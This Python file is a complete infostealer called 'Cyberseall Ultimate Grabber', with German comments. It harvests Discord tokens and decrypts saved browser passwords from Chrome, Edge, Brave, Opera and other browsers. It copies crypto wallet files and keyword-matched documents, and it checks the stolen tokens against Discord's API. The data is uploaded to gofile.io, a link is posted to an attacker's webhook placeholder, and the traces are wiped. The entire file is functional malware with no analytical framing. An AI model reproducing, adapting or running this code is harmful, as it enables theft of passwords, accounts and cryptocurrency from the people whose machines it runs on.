import os,re,requests,base64,getpass,sqlite3,shutil,platform,socket,json,zipfile,time,win32crypt,threading,psutil,subprocess
try:from Crypto.Cipher import AES
except:__import__('subprocess').run([__import__('sys').executable,'-m','pip','install','pycryptodome','--quiet'])

class CyberseallGrabber:
    def __init__(self, webhook_url):
        self.w = webhook_url
        self.t = []
        self.vt = []
        self.p = []
        self.f = []
        self.d = os.path.join(os.getenv("APPDATA"), "cyberseall")
        self.keywords = ['password','passwords','wallet','wallets','seed','seeds','private','privatekey','backup','backups','recovery']
        self.setup()
        self.g()
        self.vt = self.validate_tokens()
        self.pw()
        self.fi()
        self.si()
        self.up()
        self.send()
        self.cleanup()

    def setup(self):
        try:
            if not os.path.exists(self.d):
                os.makedirs(self.d)
            self.zf = os.path.join(self.d, "grab_" + str(int(time.time())) + ".zip")
        except:
            pass

    def g(self):
        try:
            def decrypt(buff, master_key):
                try:
                    return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                except:
                    return "Error"
            
            tokens = []
            cleaned = []
            checker = []
            already_check = []
            
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            chrome = local + "\\Google\\Chrome\\User Data"
            
            paths = {
                'Discord': roaming + '\\discord',
                'Discord Canary': roaming + '\\discordcanary',
                'Lightcord': roaming + '\\Lightcord',
                'Discord PTB': roaming + '\\discordptb',
                'Opera': roaming + '\\Opera Software\\Opera Stable',
                'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
                'Amigo': local + '\\Amigo\\User Data',
                'Torch': local + '\\Torch\\User Data',
                'Kometa': local + '\\Kometa\\User Data',
                'Orbitum': local + '\\Orbitum\\User Data',
                'CentBrowser': local + '\\CentBrowser\\User Data',
                '7Star': local + '\\7Star\\7Star\\User Data',
                'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
                'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
                'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
                'Chrome': chrome + '\\Default',
                'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
                'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
                'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                'Iridium': local + '\\Iridium\\User Data\\Default'
            }
            
            for platform, path in paths.items():
                if not os.path.exists(path): 
                    continue
                try:
                    with open(path + f"\\Local State", "r") as file:
                        key = json.loads(file.read())['os_crypt']['encrypted_key']
                        file.close()
                except: 
                    continue
                    
                leveldb_path = path + f"\\Local Storage\\leveldb\\"
                if not os.path.exists(leveldb_path):
                    continue
                    
                for file in os.listdir(leveldb_path):
                    if not file.endswith(".ldb") and not file.endswith(".log"): 
                        continue
                    try:
                        with open(leveldb_path + file, "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except PermissionError: 
                        continue
                        
                for i in tokens:
                    if i.endswith("\\"):
                        i.replace("\\", "")
                    elif i not in cleaned:
                        cleaned.append(i)
                        
                for token in cleaned:
                    try:
                        tok = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
                        if tok != "Error":
                            checker.append(tok)
                    except:
                        continue
                        
                for value in checker:
                    if value not in already_check and len(value) > 50:
                        already_check.append(value)
                        # Validiere Token direkt hier
                        headers = {'Authorization': value, 'Content-Type': 'application/json'}
                        try:
                            res = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                            if res.status_code == 200:
                                self.t.append(value)
                        except:
                            pass
            
        except:
            pass

    def validate_tokens(self):
        valid_tokens = []
        for token in self.t[:10]:  # Validiere bis zu 10 Token
            try:
                headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                if r.status_code == 200:
                    user_data = r.json()
                    
                    # Nitro-Info abrufen
                    has_nitro = False
                    days_left = 0
                    try:
                        nitro_res = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=5)
                        if nitro_res.status_code == 200:
                            nitro_data = nitro_res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            if has_nitro and len(nitro_data) > 0:
                                from datetime import datetime
                                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                days_left = abs((d2 - d1).days)
                    except:
                        pass
                    
                    token_info = {
                        'token': token,
                        'username': user_data.get('username', 'Unknown'),
                        'discriminator': user_data.get('discriminator', '0000'),
                        'id': user_data.get('id', 'Unknown'),
                        'email': user_data.get('email', 'Hidden'),
                        'phone': user_data.get('phone', 'None'),
                        'verified': user_data.get('verified', False),
                        'mfa_enabled': user_data.get('mfa_enabled', False),
                        'premium_type': user_data.get('premium_type', 0),
                        'has_nitro': has_nitro,
                        'nitro_days_left': days_left
                    }
                    valid_tokens.append(token_info)
            except:
                pass
        return valid_tokens

    def pw(self):
        try:
            # Erweiterte Browser-Pfade definieren
            BROWSER_PATHS = {}
            
            # Chrome Profile
            chrome_base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
            if os.path.exists(chrome_base):
                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]:
                    profile_path = os.path.join(chrome_base, profile)
                    if os.path.exists(profile_path):
                        BROWSER_PATHS[f"Chrome ({profile})"] = {
                            "profile_path": profile_path,
                            "login_db": "\\Login Data"
                        }
            
            # Edge Profile
            edge_base = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data")
            if os.path.exists(edge_base):
                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
                    profile_path = os.path.join(edge_base, profile)
                    if os.path.exists(profile_path):
                        BROWSER_PATHS[f"Edge ({profile})"] = {
                            "profile_path": profile_path,
                            "login_db": "\\Login Data"
                        }
            
            # Brave Profile
            brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
            if os.path.exists(brave_base):
                for profile in ["Default", "Profile 1", "Profile 2"]:
                    profile_path = os.path.join(brave_base, profile)
                    if os.path.exists(profile_path):
                        BROWSER_PATHS[f"Brave ({profile})"] = {
                            "profile_path": profile_path,
                            "login_db": "\\Login Data"
                        }
            
            # Weitere Browser
            other_browsers = {
                "Opera": {
                    "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
                    "login_db": "\\Login Data"
                },
                "Opera GX": {
                    "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
                    "login_db": "\\Login Data"
                },
                "Vivaldi": {
                    "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default"),
                    "login_db": "\\Login Data"
                },
                "Yandex": {
                    "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"),
                    "login_db": "\\Ya Passman Data"
                },
                "Chromium": {
                    "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data", "Default"),
                    "login_db": "\\Login Data"
                }
            }
            
            # Füge andere Browser hinzu, wenn sie existieren
            for name, data in other_browsers.items():
                if os.path.exists(data["profile_path"]):
                    BROWSER_PATHS[name] = data
            
            def decrypt_password(password, key):
                try:
                    if not password or len(password) < 3:
                        return "Failed to decrypt"

                    # Methode 1: AES-GCM Entschlüsselung (Chrome 80+)
                    try:
                        if password[:3] == b'v10' or password[:3] == b'v11':
                            iv = password[3:15]
                            encrypted_data = password[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                            if decrypted_pass and len(decrypted_pass) > 0:
                                return decrypted_pass
                    except Exception as e:
                        pass

                    # Methode 2: Direkte AES-GCM ohne Version-Check
                    try:
                        if len(password) >= 15:
                            iv = password[3:15]
                            encrypted_data = password[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                            if decrypted_pass and len(decrypted_pass) > 0:
                                return decrypted_pass
                    except Exception as e:
                        pass

                    # Methode 3: DPAPI Entschlüsselung (Chrome <80)
                    try:
                        result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                        if result and result[1]:
                            decrypted = result[1].decode('utf-8') if isinstance(result[1], bytes) else str(result[1])
                            if decrypted and len(decrypted) > 0:
                                return decrypted
                    except Exception as e:
                        pass

                    # Methode 4: Alternative AES-GCM mit verschiedenen IV-Längen
                    try:
                        for iv_start in [3, 0, 12]:
                            for iv_len in [12, 16, 8]:
                                if len(password) >= iv_start + iv_len + 16:
                                    iv = password[iv_start:iv_start + iv_len]
                                    encrypted_data = password[iv_start + iv_len:]
                                    cipher = AES.new(key, AES.MODE_GCM, iv)
                                    decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                                    if decrypted_pass and len(decrypted_pass) > 0:
                                        return decrypted_pass
                    except Exception as e:
                        pass

                    # Methode 5: Rohe Bytes-Analyse für teilweise Wiederherstellung
                    try:
                        if isinstance(password, bytes) and len(password) > 10:
                            printable_chars = ''.join(chr(c) for c in password if 32 <= c <= 126)
                            if len(printable_chars) > 3:
                                return f"Partial: {printable_chars[:50]}"
                    except:
                        pass

                    return "Failed to decrypt"
                except Exception as e:
                    return f"Error: {str(e)[:30]}"
            
            def get_browser_passwords():
                passwords = []
                browser_data = BROWSER_PATHS

                for browser, data in browser_data.items():
                    try:
                        profile_path = data["profile_path"]
                        login_db = data["login_db"]

                        if not os.path.exists(profile_path):
                            continue

                        if "signons.sqlite" in login_db:
                            continue

                        full_login_db_path = os.path.join(profile_path + login_db)
                        if not os.path.exists(full_login_db_path):
                            continue

                        state_file = os.path.join(profile_path, "Local State")
                        if not os.path.exists(state_file):
                            continue

                        with open(state_file, "r", encoding="utf-8") as f:
                            local_state = json.loads(f.read())
                            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

                        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

                        temp_db = os.path.join(os.getenv("TEMP"), f"{browser.replace(' ', '_')}_login_data.db")
                        if os.path.exists(temp_db):
                            os.remove(temp_db)

                        with open(full_login_db_path, "rb") as login_data_file:
                            with open(temp_db, "wb") as temp_file:
                                temp_file.write(login_data_file.read())

                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()

                        try:
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            login_data = cursor.fetchall()

                            success_count = 0
                            failed_count = 0

                            for url, username, password in login_data:
                                if not url or not username or not password:
                                    continue

                                try:
                                    decrypted_password = decrypt_password(password, master_key)

                                    if url and username and decrypted_password:
                                        if decrypted_password != "Failed to decrypt":
                                            success_count += 1
                                        else:
                                            failed_count += 1

                                        passwords.append({
                                            "browser": browser,
                                            "url": url,
                                            "username": username,
                                            "password": decrypted_password
                                        })
                                except Exception as e:
                                    failed_count += 1
                                    passwords.append({
                                        "browser": browser,
                                        "url": url,
                                        "username": username,
                                        "password": f"Error: {str(e)[:30]}"
                                    })

                            # Debug-Info in Datei schreiben statt print
                            try:
                                debug_file = os.path.join(self.d, "debug.txt")
                                with open(debug_file, "a", encoding="utf-8") as df:
                                    if success_count > 0:
                                        df.write(f"Successfully decrypted {success_count} passwords from {browser} ({failed_count} failed)\n")
                                    elif failed_count > 0:
                                        df.write(f"Failed to decrypt all {failed_count} passwords from {browser}\n")
                            except:
                                pass

                        except Exception as e:
                            # Debug-Info in Datei schreiben statt print
                            try:
                                debug_file = os.path.join(self.d, "debug.txt")
                                with open(debug_file, "a", encoding="utf-8") as df:
                                    df.write(f"Error executing SQL query in {browser}: {str(e)}\n")
                            except:
                                pass

                        cursor.close()
                        conn.close()

                        try:
                            os.remove(temp_db)
                        except:
                            pass

                    except Exception as e:
                        # Debug-Info in Datei schreiben statt print
                        try:
                            debug_file = os.path.join(self.d, "debug.txt")
                            with open(debug_file, "a", encoding="utf-8") as df:
                                df.write(f"Error processing {browser}: {str(e)}\n")
                        except:
                            pass

                return passwords
            
            # Hole alle Browser-Passwörter
            password_data = get_browser_passwords()
            
            # Konvertiere zu String-Format für Kompatibilität
            pw_data = []
            for pwd in password_data:
                password_entry = f"{pwd['browser']} | {pwd['url']} | {pwd['username']} | {pwd['password']}"
                pw_data.append(password_entry)
            
            # Speichere alle gefundenen Passwörter
            self.p = pw_data
            
            if pw_data:
                try:
                    with open(os.path.join(self.d, "passwords.txt"), "w", encoding="utf-8") as f:
                        f.write("=" * 60 + "\n")
                        f.write("🔥 CYBERSEALL BROWSER PASSWORD STEALER 2025 🔥\n")
                        f.write("=" * 60 + "\n\n")
                        
                        # Gruppiere Passwörter nach Browser
                        browser_groups = {}
                        for password in pw_data:
                            browser = password.split(" |")[0]
                            if browser not in browser_groups:
                                browser_groups[browser] = []
                            browser_groups[browser].append(password)
                        
                        for browser, passwords in browser_groups.items():
                            f.write(f"\n🌐 {browser.upper()} ({len(passwords)} passwords)\n")
                            f.write("-" * 50 + "\n")
                            for password in passwords:
                                f.write(password + "\n")
                            f.write("\n")
                        
                        f.write("=" * 60 + "\n")
                        f.write(f"📊 TOTAL PASSWORDS FOUND: {len(pw_data)}\n")
                        f.write(f"🔍 BROWSERS SCANNED: {len(browser_groups)}\n")
                        f.write("=" * 60 + "\n")
                        
                except Exception as e:
                    pass
            
        except Exception as e:
            pass

    def fi(self):
        try:
            files_data = []
            
            # Nur die wichtigsten Verzeichnisse durchsuchen
            target_dirs = [
                os.path.join(os.getenv("USERPROFILE"), "Desktop"),
                os.path.join(os.getenv("USERPROFILE"), "Documents"),
                os.path.join(os.getenv("USERPROFILE"), "Downloads")
            ]
            
            for d in target_dirs:
                if os.path.exists(d):
                    for r, ds, fs in os.walk(d):
                        for f in fs[:10]:  # Limit auf 10 Dateien pro Verzeichnis
                            if any(keyword in f.lower() for keyword in self.keywords) and f.lower().endswith(('.txt','.key','.wallet','.json','.dat')) and os.path.getsize(os.path.join(r,f)) < 1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "file_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 10:
                                    break
                        if len(files_data) >= 10:
                            break
                    if len(files_data) >= 10:
                        break
            
            # Nur die wichtigsten Crypto-Wallets für bessere Performance
            crypto_paths = [
                os.path.join(os.getenv("APPDATA"), "Exodus"),
                os.path.join(os.getenv("APPDATA"), "atomic"),
                os.path.join(os.getenv("APPDATA"), "Electrum"),
                os.path.join(os.getenv("APPDATA"), "MetaMask"),
                os.path.join(os.getenv("APPDATA"), "Phantom"),
                os.path.join(os.getenv("APPDATA"), "TronLink"),
                os.path.join(os.getenv("APPDATA"), "Binance"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Coinomi")
            ]
            
            for cp in crypto_paths:
                if os.path.exists(cp):
                    for r, ds, fs in os.walk(cp):
                        for f in fs[:5]:  # Limit auf 5 Dateien pro Wallet
                            if f.lower().endswith(('.wallet','.dat','.key','.json')) and os.path.getsize(os.path.join(r,f)) < 5*1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "crypto_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 15:
                                    break
                        if len(files_data) >= 15:
                            break
                    if len(files_data) >= 15:
                        break
            
            self.f = files_data
            with open(os.path.join(self.d, "files.txt"), "w") as f:
                f.write("\n".join(files_data))
        except:
            pass

    def si(self):
        try:
            sys_info = {
                "user": getpass.getuser(),
                "computer": os.getenv("COMPUTERNAME", "Unknown"),
                "platform": platform.platform(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "tokens_found": len(set(self.t)),
                "valid_tokens": len(self.vt),
                "passwords_found": len(self.p),
                "files_found": len(self.f)
            }
            with open(os.path.join(self.d, "system_info.json"), "w") as f:
                json.dump(sys_info, f, indent=2)
            with open(os.path.join(self.d, "valid_tokens.json"), "w") as f:
                json.dump(self.vt, f, indent=2)
        except:
            pass

    def up(self):
        try:
            with zipfile.ZipFile(self.zf, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(self.d):
                    for file in files:
                        if not file.endswith('.zip'):
                            fp = os.path.join(root, file)
                            zf.write(fp, os.path.relpath(fp, self.d))
            
            files = {"file": open(self.zf, "rb")}
            resp = requests.post("https://store1.gofile.io/uploadFile", files=files, timeout=30)
            files["file"].close()
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "ok":
                    self.link = data["data"]["downloadPage"]
                else:
                    self.link = "Upload failed"
            else:
                self.link = "Upload failed"
            
            try:
                os.remove(self.zf)
            except:
                pass
        except:
            self.link = "Upload failed"

    def send(self):
        try:
            embed = {
                "embeds": [{
                    "title": "🔥 CYBERSEALL ULTIMATE GRABBER v4.2",
                    "color": 0xff0000,
                    "fields": [
                        {
                            "name": "💎 Results",
                            "value": "```" + str(len(set(self.t))) + " Raw Tokens\n" + str(len(self.vt)) + " Valid Tokens\n" + str(len(self.p)) + " Browser Passwords\n" + str(len(self.f)) + " Keyword Files```"
                        },
                        {
                            "name": "💻 Target",
                            "value": "```" + getpass.getuser() + "@" + os.getenv("COMPUTERNAME", "?") + "```"
                        },
                        {
                            "name": "📁 Download",
                            "value": "[**CLICK HERE TO DOWNLOAD**](" + str(self.link if hasattr(self, 'link') else 'Failed') + ")",
                            "inline": False
                        }
                    ],
                    "footer": {"text": "Cyberseall ULTIMATE Grabber v4.2 - Optimized Token Extraction"},
                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                }]
            }
            
            requests.post(self.w, json=embed, timeout=10)
            
            # Sende alle validen Token mit Nitro-Info
            if len(self.vt) > 0:
                for i, token_info in enumerate(self.vt[:5]):  # Max 5 Token
                    token_embed = {
                        "embeds": [{
                            "title": "✅ VALID TOKEN #" + str(i+1),
                            "color": 0x00ff00,
                            "fields": [
                                {
                                    "name": "👤 User",
                                    "value": "```" + token_info.get('username', '?') + "#" + token_info.get('discriminator', '?') + "```"
                                },
                                {
                                    "name": "📧 Email",
                                    "value": "```" + str(token_info.get('email', 'Hidden')) + "```"
                                },
                                {
                                    "name": "📱 Phone",
                                    "value": "```" + str(token_info.get('phone', 'None')) + "```"
                                },
                                {
                                    "name": "💎 Nitro",
                                    "value": "```Has Nitro: " + str(token_info.get('has_nitro', False)) + "\nDays Left: " + str(token_info.get('nitro_days_left', 0)) + "```"
                                },
                                {
                                    "name": "🔐 Token",
                                    "value": "```" + token_info['token'][:50] + "...```"
                                },
                                {
                                    "name": "🛡️ Security",
                                    "value": "```MFA: " + str(token_info.get('mfa_enabled', False)) + "\nVerified: " + str(token_info.get('verified', False)) + "\nPremium: " + str(token_info.get('premium_type', 0)) + "```"
                                }
                            ],
                            "footer": {"text": "Valid Token Info with Nitro"},
                            "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                        }]
                    }
                    requests.post(self.w, json=token_embed, timeout=5)
        except:
            pass

    def cleanup(self):
        try:
            time.sleep(1)
            if os.path.exists(self.d):
                shutil.rmtree(self.d, ignore_errors=True)
        except:
            pass

# WEBHOOK_PLACEHOLDER wird durch die Mini-Payload ersetzt
if __name__ == "__main__":
    CyberseallGrabber("WEBHOOK_PLACEHOLDER") 
